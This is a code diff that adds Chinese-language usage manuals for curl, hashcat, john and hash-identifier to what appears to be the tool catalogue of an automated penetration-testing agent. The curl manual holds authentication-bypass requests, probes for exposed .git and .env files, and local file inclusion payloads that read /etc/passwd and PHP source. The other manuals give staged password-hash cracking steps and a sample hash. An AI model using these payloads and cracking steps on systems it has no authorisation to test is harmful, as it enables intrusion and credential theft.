@@ -265,10 +265,57 @@ TOOL_MANUALS = {
         },
     },
     "curl": {
-        "description": "HTTP 请求工具",
+        "description": "HTTP 请求工具，用于验证服务、获取响应、测试认证绕过",
         "manual": """
-通过 curl 发起 HTTP 请求
-捕获响应，注意添加-L允许重定向
+⚠️ curl 使用指南 ⚠️
+
+════════════════════════════════════════════════
+基本请求：
+════════════════════════════════════════════════
+  curl -v http://<target>/                     # 查看完整请求/响应头
+  curl -s http://<target>/ | head -50           # 静默模式，只看前50行
+  curl -L http://<target>/                      # 跟随重定向
+
+════════════════════════════════════════════════
+带认证的请求：
+════════════════════════════════════════════════
+  curl -u user:pass http://<target>/             # Basic Auth
+  curl -u user:pass http://<target>:8888/        # 指定端口
+
+════════════════════════════════════════════════
+认证绕过测试：
+════════════════════════════════════════════════
+  # 路径绕过
+  curl http://<target>/..%2f/admin
+  curl http://<target>/;/admin
+
+  # 请求头绕过
+  curl -H "X-Original-URL: /admin" http://<target>/
+  curl -H "X-Forwarded-For: 127.0.0.1" http://<target>/
+
+  # HTTP方法绕过
+  curl -X PUT http://<target>/admin
+  curl -X OPTIONS http://<target>/
+
+════════════════════════════════════════════════
+目录与文件枚举：
+════════════════════════════════════════════════
+  curl -s http://<target>/robots.txt
+  curl -s http://<target>/sitemap.xml
+  curl -s http://<target>/.git/HEAD
+  curl -s http://<target>/.env
+
+════════════════════════════════════════════════
+LFI（本地文件包含）测试：
+════════════════════════════════════════════════
+  # 直接包含
+  curl "http://<target>/page.php?file=/etc/passwd"
+
+  # PHP filter 读取源码（base64编码）
+  curl "http://<target>/page.php?file=php://filter/convert.base64-encode/resource=page.php"
+
+  # 解码base64结果
+  echo '<base64_output>' | base64 -d
 """,
         "return_format": {
             "type": "json",
@@ -553,7 +600,44 @@ FTP爆破：
     "hashcat": {
         "description": "GPU 加速 Hash 破解工具",
         "manual": """
-执行 hashcat -m <mode> -a 0 <hash> <wordlist>
+⚠️ hashcat 使用指南 ⚠️
+
+════════════════════════════════════════════════
+常见 Hash 类型对应编号：
+════════════════════════════════════════════════
+  0     = MD5
+  1000  = NTLM
+  500   = Cisco-IAP(MD5)
+  1600  = Apache APR1-MD5 ($apr1$)
+  1800  = SHA-512(Unix) ($6$)
+  3200  = bcrypt ($2a$/ $2b$/ $2y$)
+  22000 = WPA-PBKDF2
+  13100 = Kerberoast (TGS-REP)
+
+════════════════════════════════════════════════
+分阶段破解策略：
+════════════════════════════════════════════════
+阶段1 - 快速破解（几秒~1分钟）：
+  echo '<hash>' > /tmp/hash.txt
+  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt
+
+阶段2 - 中等字典（1~5分钟）：
+  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/best1050.txt
+
+阶段3 - 规则破解（基于阶段1的字典+规则变换）：
+  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule
+
+════════════════════════════════════════════════
+Apache APR1-MD5 示例（.htpasswd常见格式）：
+════════════════════════════════════════════════
+  echo 'nginx:$apr1$azDw/Iwv$E7rIlqjeiX9Sx9.sMCcAZ0' > /tmp/hash.txt
+  hashcat -m 1600 /tmp/hash.txt /usr/share/wordlists/fasttrack.txt
+
+════════════════════════════════════════════════
+绝对禁止：
+════════════════════════════════════════════════
+❌ 禁止使用 rockyou.txt 作为第一步
+❌ 禁止不指定 -m 参数（必须指定hash类型）
 """,
         "return_format": {
             "type": "json",
@@ -563,7 +647,34 @@ FTP爆破：
     "john": {
         "description": "John the Ripper 密码破解工具",
         "manual": """
-执行 john <hashfile>
+⚠️ john 使用指南 ⚠️
+
+════════════════════════════════════════════════
+分阶段破解策略：
+════════════════════════════════════════════════
+阶段1 - 快速破解：
+  echo '<hash>' > /tmp/hash.txt
+  john /tmp/hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt
+
+阶段2 - 格式指定破解：
+  john /tmp/hash.txt --format=<format> --wordlist=/usr/share/wordlists/best1050.txt
+
+阶段3 - 规则破解：
+  john /tmp/hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt --rules
+
+════════════════════════════════════════════════
+常见格式：
+════════════════════════════════════════════════
+  --format=md5crypt      # MD5(Unix) / Apache APR1
+  --format=sha512crypt   # SHA-512(Unix)
+  --format=bcrypt        # Blowfish
+  --format=raw-md5       # 纯MD5
+  --format=nt            # NTLM
+
+════════════════════════════════════════════════
+查看已破解的密码：
+════════════════════════════════════════════════
+  john /tmp/hash.txt --show
 """,
         "return_format": {
             "type": "json",
@@ -578,11 +689,27 @@ FTP爆破：
         "return_format": {"type": "json", "schema": {"passwords": ["string"]}},
     },
     "hash-identifier": {
-        "description": "Hash 类型识别工具",
+        "description": "Hash 类型识别工具，用于确定哈希算法类型",
         "manual": """
-执行 hash-identifier 并解析候选算法
+识别 Hash 类型，确定应使用 hashcat 的哪个 -m 参数：
+
+  1. 将哈希值粘贴到交互式界面
+  2. 记录工具识别出的可能类型
+  3. 使用识别结果选择正确的 hashcat -m 参数
+
+常见哈希特征：
+  $apr1$     → hashcat -m 1600 (Apache APR1-MD5)
+  $1$        → hashcat -m 500  (MD5-crypt)
+  $2a$/ $2b$ → hashcat -m 3200 (bcrypt)
+  $6$        → hashcat -m 1800 (SHA-512-crypt)
+  $5$        → hashcat -m 4400 (SHA-256-crypt)
+  无前缀32位  → hashcat -m 0    (MD5)
+  无前缀40位  → hashcat -m 100  (SHA1)
 """,
-        "return_format": {"type": "json", "schema": {"possible_types": ["string"]}},
+        "return_format": {
+            "type": "json",
+            "schema": {"possible_types": ["string"]},
+        },
     },
     "airmon-ng": {
         "description": "无线网卡监听模式工具",
